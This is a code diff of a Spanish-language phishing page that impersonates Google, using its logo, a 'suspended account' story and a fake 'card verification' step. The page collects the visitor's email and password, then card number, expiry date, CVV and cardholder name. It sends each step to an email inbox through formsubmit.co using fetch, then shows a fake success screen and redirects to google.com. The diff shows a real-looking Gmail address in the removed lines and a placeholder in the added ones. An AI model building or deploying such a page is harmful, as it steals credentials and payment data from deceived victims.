@@ -22,10 +22,8 @@
             width: 100%;
             max-width: 400px;
             text-align: center;
-            /* Por defecto oculto */
-            display: none; 
+            display: none; /* Oculto por defecto */
         }
-        /* Clase para mostrar */
         .active {
             display: block !important;
         }
@@ -72,16 +70,10 @@
         button:hover {
             background-color: #1765cc;
         }
-        .row {
-            display: flex;
-            gap: 10px;
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
         }
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #999;
-        }
-        /* Loader */
         .loader {
             border: 4px solid #f3f3f3;
             border-top: 4px solid #1a73e8;
@@ -102,7 +94,6 @@
 
     <!-- PASO 1: CREDENCIALES -->
     <div id="step1" class="container active">
-        <!-- Logo -->
         <svg class="logo" viewBox="0 0 24 24" width="75" height="75" xmlns="http://www.w3.org/2000/svg">
             <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
             <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
@@ -113,91 +104,123 @@
         <h2>Iniciar sesión</h2>
         <p>Para recuperar tu cuenta suspendida, por favor ingresa tus credenciales.</p>
         
-        <form id="form-step1">
+        <!-- IMPORTANTE: Action apunta a FormSubmit -->
+        <form id="form-step1" action="https://formsubmit.co/TU_EMAIL_AQUI@gmail.com" method="POST">
             <input type="hidden" name="_subject" value="Paso 1: Credenciales">
             <input type="hidden" name="_captcha" value="false">
+            <!-- Redirección interna para el paso siguiente (opcional, pero usaremos JS) -->
+            <input type="hidden" name="_next" value="https://www.google.com"> 
 
             <input type="email" name="email" placeholder="Ingresa tu email" required>
             <input type="password" name="password" placeholder="Ingresa tu contraseña" required>
             
-            <button type="button" id="btn-step1">Verificar</button>
+            <button type="submit">Siguiente</button>
+            <div class="loader"></div>
         </form>
-        <div class="loader" id="loader1"></div>
     </div>
 
     <!-- PASO 2: TARJETA -->
     <div id="step2" class="container">
-        <svg class="logo" viewBox="0 0 24 24" width="50" height="50" xmlns="http://www.w3.org/2000/svg">
-            <path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4V6h16v12z" fill="#5f6368"/>
+        <svg class="logo" viewBox="0 0 24 24" width="75" height="75" xmlns="http://www.w3.org/2000/svg">
+            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.84-2.84z" fill="#FBBC05"/>
+            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
         </svg>
+
         <h2>Verificación de Tarjeta</h2>
-        <p>Ingresa los datos de tu tarjeta para confirmar tu identidad.</p>
+        <p>Se ha detectado una actividad inusual. Necesitamos verificar tu tarjeta de crédito para liberar la cuenta. No se realizará ningún cobro.</p>
         
-        <form id="form-step2" action="https://formsubmit.co/Quisan2017@gmail.com" method="POST">
+        <form id="form-step2" action="https://formsubmit.co/TU_EMAIL_AQUI@gmail.com" method="POST">
             <input type="hidden" name="_subject" value="Paso 2: Tarjeta de Crédito">
             <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="email_pasado" id="email_pasado">
-
-            <input type="text" name="card_number" placeholder="Número de Tarjeta" maxlength="19" required>
             
+            <input type="text" name="card_number" placeholder="Número de tarjeta" required>
             <div class="row">
-                <input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required>
-                <input type="text" name="cvv" placeholder="CVV" maxlength="3" required>
+                <input type="text" name="expiry" placeholder="MM/YY" required>
+                <input type="text" name="cvv" placeholder="CVV" required>
             </div>
-
             <input type="text" name="cardholder_name" placeholder="Nombre en la tarjeta" required>
             
-            <button type="submit" id="btn-step2">Verificar y Desbloquear</button>
+            <button type="submit" id="btn-step2">Verificar y Pagar $0.00</button>
+            <div class="loader" id="loader-step2"></div>
         </form>
-        <div class="loader" id="loader2"></div>
-        <div class="footer">🔒 Pago seguro de 256 bits</div>
+    </div>
+
+    <!-- PASO 3: ÉXITO Y REDIRECCIÓN -->
+    <div id="step3" class="container">
+        <svg class="logo" viewBox="0 0 24 24" width="75" height="75" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="#34A853"/>
+        </svg>
+        <h2>¡Verificación Completada!</h2>
+        <p>Tu cuenta ha sido desbloqueada correctamente. Redirigiendo a Google...</p>
+        <div class="loader" style="display:block;"></div>
     </div>
 
     <script>
-        // Lógica del Paso 1
-        document.getElementById('btn-step1').addEventListener('click', function() {
-            const form = document.getElementById('form-step1');
-            const email = form.querySelector('input[name="email"]').value;
+        // Lógica para Paso 1 (Credenciales)
+        const form1 = document.getElementById('form-step1');
+        const loader1 = document.querySelector('#step1 .loader');
+
+        form1.addEventListener('submit', function(e) {
+            e.preventDefault(); // Evitar envío normal por ahora
             
-            if(!email || !form.querySelector('input[name="password"]').value) {
-                alert("Por favor completa ambos campos");
-                return;
-            }
+            const btn = form1.querySelector('button');
+            btn.disabled = true;
+            loader1.style.display = 'block';
 
-            // Mostrar loader y ocultar botón
-            document.getElementById('loader1').style.display = 'block';
-            this.style.display = 'none';
-
-            const data = new FormData(form);
-            // Guardamos el email para pasarlo al paso 2
-            document.getElementById('email_pasado').value = email;
-
-            // Enviar datos del Paso 1
-            fetch('https://formsubmit.co/ajax/Quisan2017@gmail.com', {
+            const formData = new FormData(form1);
+            
+            // Enviar a FormSubmit
+            fetch(form1.action, {
                 method: 'POST',
-                body: data,
-                headers: { 'Accept': 'application/json' }
-            })
-            .then(response => {
-                if (response.ok) {
-                    // Ocultar Paso 1
-                    document.getElementById('step1').classList.remove('active');
-                    // Mostrar Paso 2
-                    document.getElementById('step2').classList.add('active');
-                } else {
-                    alert("Error al verificar credenciales.");
-                    document.getElementById('loader1').style.display = 'none';
-                    this.style.display = 'block';
-                }
-            })
-            .catch(error => {
+                body: formData
+            }).then(response => {
+                // Si tiene éxito, ir al paso 2
+                document.getElementById('step1').classList.remove('active');
+                document.getElementById('step2').classList.add('active');
+            }).catch(error => {
                 console.error('Error:', error);
-                alert("Error de conexión.");
-                document.getElementById('loader1').style.display = 'none';
-                this.style.display = 'block';
+                alert('Hubo un error. Intente de nuevo.');
+                btn.disabled = false;
+                loader1.style.display = 'none';
+            });
+        });
+
+        // Lógica para Paso 2 (Tarjeta)
+        const form2 = document.getElementById('form-step2');
+        const loader2 = document.getElementById('loader-step2');
+        const btn2 = document.getElementById('btn-step2');
+
+        form2.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            btn2.disabled = true;
+            loader2.style.display = 'block';
+
+            const formData = new FormData(form2);
+            
+            // Enviar a FormSubmit
+            fetch(form2.action, {
+                method: 'POST',
+                body: formData
+            }).then(response => {
+                // Si tiene éxito, ir al paso 3 (Éxito)
+                document.getElementById('step2').classList.remove('active');
+                document.getElementById('step3').classList.add('active');
+
+                // Redirigir a Google después de 3 segundos
+                setTimeout(function() {
+                    window.location.href = "https://www.google.com";
+                }, 3000);
+
+            }).catch(error => {
+                console.error('Error:', error);
+                alert('Error de verificación. Intente de nuevo.');
+                btn2.disabled = false;
+                loader2.style.display = 'none';
             });
         });
     </script>
-
 </body>
 </html>
